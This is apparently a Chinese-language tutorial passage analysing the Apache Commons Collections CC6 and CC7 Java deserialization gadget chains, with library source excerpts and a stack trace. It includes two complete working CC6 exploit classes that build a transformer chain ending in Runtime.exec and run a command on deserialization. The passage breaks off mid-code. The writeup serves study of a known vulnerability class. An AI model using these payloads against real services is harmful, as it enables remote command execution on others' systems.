<h4 id="åŸç†åˆ†æï¼ˆHashMapâ†’TiedMapEntryâ†’LazyMapï¼‰"><a href="#åŸç†åˆ†æï¼ˆHashMapâ†’TiedMapEntryâ†’LazyMapï¼‰" class="headerlink" title="åŸç†åˆ†æï¼ˆHashMapâ†’TiedMapEntryâ†’LazyMapï¼‰"></a>åŸç†åˆ†æï¼ˆHashMapâ†’TiedMapEntryâ†’LazyMapï¼‰</h4><p><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> çš„ <code>hashCode</code> æ–¹æ³•ä¼šè°ƒç”¨åˆ°å†…éƒ¨æˆå‘˜ <code>map</code> çš„ <code>get</code> æ–¹æ³•ï¼Œå¦‚æœ <code>map</code> è¢« <code>LazyMap</code> ä¿®é¥°è¿‡å°±å¯ä»¥è°ƒç”¨åˆ° <code>transform</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>å¦å¤–è§¦å‘ <code>TiedMapEntry#getValue</code> è§¦å‘ <code>LazyMap#get</code> å‡½æ•°è°ƒç”¨æ—¶ä¼ å…¥çš„å‚æ•°æ˜¯å¯æ§çš„ <code>TiedMapEntry#key</code>ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿™ä¸ªç‰¹æ€§ä¼˜åŒ–æ‰ <code>ChainedTransformer</code> ä¸­çš„ <code>ConstantTransformer</code>ï¼›å†ç»“åˆ CC3 ä»»æ„å­—èŠ‚ç åŠ è½½å¯ä»¥ä¼˜åŒ–æ‰æ•´ä¸ª <code>ChainedTransformer</code>ã€‚</p>

    </div>
  </div>

<p><code>java.util.HashMap#readObject</code> æ–¹æ³•ä¼šå¯¹ <code>key</code> è°ƒç”¨ <code>hash</code> æ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨ <code>key</code> çš„ <code>hashCode</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰-3"><a href="#åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰-3" class="headerlink" title="åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰"></a>åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, Runtime.class);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">triggerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        triggerMap.put(entry, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> triggerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, Runtime.class);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">triggerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        triggerMap.put(entry, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> triggerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>éœ€è¦æ³¨æ„çš„æ˜¯ <code>HashMap</code> çš„ <code>put</code> æ–¹æ³•åŒæ ·å¯¹ <code>key</code> è°ƒç”¨ <code>hash</code> æ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨ <code>key</code> çš„ <code>hashCode</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤åœ¨ poc ä¸­å½“æˆ‘ä»¬ <code>triggerMap.put(entry, &quot;123&quot;)</code> æ—¶ä¼šè°ƒç”¨ <code>TiedMapEntry#hashCode</code> ä»è€Œè°ƒç”¨ <code>LazyMap#get</code>ï¼Œä½¿å¾— <code>TiedMapEntry#key</code> å·²ç»æ”¾åˆ° <code>TiedMapEntry#map</code>ï¼ˆ<code>LazyMap</code>ï¼‰ä¸­äº†ï¼Œå› æ­¤ä¼šå¯¼è‡´åç»­ååºåˆ—åŒ–è™½ç„¶è°ƒç”¨åˆ° <code>LazyMap#get</code>ï¼Œä½†æ˜¯è°ƒç”¨ä¸åˆ° <code>transform</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è§£å†³æ–¹æ³•æ˜¯è°ƒç”¨ <code>LazyMap#clear</code> æ¸…ç©º <code>LazyMap</code> ã€‚</p>

    </div>
  </div>

<h3 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)</span><br><span class="line">at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:158)</span><br><span class="line">at java.util.AbstractMap.equals(AbstractMap.java:469)</span><br><span class="line">at org.apache.commons.collections.map.AbstractMapDecorator.equals(AbstractMapDecorator.java:130)</span><br><span class="line">at java.util.Hashtable.reconstitutionPut(Hashtable.java:1221)</span><br><span class="line">at java.util.Hashtable.readObject(Hashtable.java:1195)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æï¼ˆHashtableâ†’LazyMapï¼‰"><a href="#åŸç†åˆ†æï¼ˆHashtableâ†’LazyMapï¼‰" class="headerlink" title="åŸç†åˆ†æï¼ˆHashtableâ†’LazyMapï¼‰"></a>åŸç†åˆ†æï¼ˆHashtableâ†’LazyMapï¼‰</h4><p><code>Hashtable</code> çš„ <code>readObject</code> è°ƒç”¨ <code>reconstitutionPut</code> å‡½æ•°å°†ååºåˆ—åŒ–å‡ºçš„é”®å€¼å¯¹å­˜å‚¨åˆ°å“ˆå¸Œè¡¨ <code>table</code> ä¸­ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è‡ªå®šä¹‰ååºåˆ—åŒ–ï¼šæŠŠ Hashtable ä»å­—èŠ‚æµè¿˜åŸä¸ºå†…å­˜ç»“æ„ã€‚</span></span><br><span class="line"><span class="comment">// æ­¥éª¤ï¼šè¯»å–åŸºç¡€å­—æ®µ(sizeã€thresholdã€loadFactor ç­‰) â†’ è¯»å–å…ƒç´ ä¸ªæ•° elements â†’ é€å¯¹è¯»å– key/value â†’ æ”¾å…¥å“ˆå¸Œè¡¨ã€‚</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// è¯»å–é»˜è®¤å¯åºåˆ—åŒ–å­—æ®µï¼ˆå¦‚ sizeã€thresholdã€loadFactorã€table å®¹é‡ä¿¡æ¯ç­‰ï¼‰</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¾æ¬¡è¯»å– elements å¯¹é”®å€¼ï¼ˆåºåˆ—åŒ–æ—¶æŒ‰ keyã€value æˆå¯¹å†™å…¥ï¼‰</span></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();     <span class="comment">// è¯»å–ä¸€ä¸ª keyï¼ˆè‹¥ä¸º nullï¼Œåç»­ hashCode() å°†æŠ› NPEï¼‰</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();   <span class="comment">// è¯»å–ä¸€ä¸ª valueï¼ˆHashtable ä¸å…è®¸ null å€¼ï¼‰</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–å‡ºçš„é”®å€¼å¯¹å­˜å‚¨åˆ°å“ˆå¸Œè¡¨ä¸­</span></span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>reconstitutionPut</code> å‡½æ•°å…ˆå¯¹ä¼ å…¥çš„ <code>key</code> è°ƒç”¨ <code>hashCode</code> æ–¹æ³•å¾—åˆ°å“ˆå¸Œå€¼ï¼Œç„¶åè®¡ç®—å‡ºå“ˆå¸Œå€¼å¯¹åº”å“ˆå¸Œè¡¨çš„ä¸‹æ ‡ <code>index</code>ã€‚åœ¨å“ˆå¸Œè¡¨ <code>tab</code> ä¸­éå† <code>index</code> å¯¹åº”çš„é‚£ä¸€é¡¹ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´  <code>e</code>ï¼Œç„¶ååˆ¤æ–­è¯¥å…ƒç´ çš„å“ˆå¸Œå€¼ä¸å½“å‰è¦æ·»åŠ çš„é‚£ä¸€é¡¹çš„å“ˆå¸Œå€¼æ˜¯å¦ç›¸ç­‰ã€‚å¦‚æœ<strong>å“ˆå¸Œå€¼ç›¸ç­‰</strong>åˆ™è°ƒç”¨ <code>e.key.equals</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°†ä¸€å¯¹ key/value æ’å…¥åˆ°å“ˆå¸Œè¡¨ bucket ä¸­ï¼ˆç”¨äºâ€œé‡å»ºâ€è¿‡ç¨‹ï¼‰ã€‚</span></span><br><span class="line"><span class="comment">// è¦æ±‚ï¼švalue ä¸èƒ½ä¸º nullï¼›ä¸”å“ˆå¸Œè¡¨ä¸­ä¸åº”å·²å­˜åœ¨ç›¸åŒ keyï¼ˆå¦åˆ™è§†ä¸ºæµæŸåï¼‰ã€‚</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span 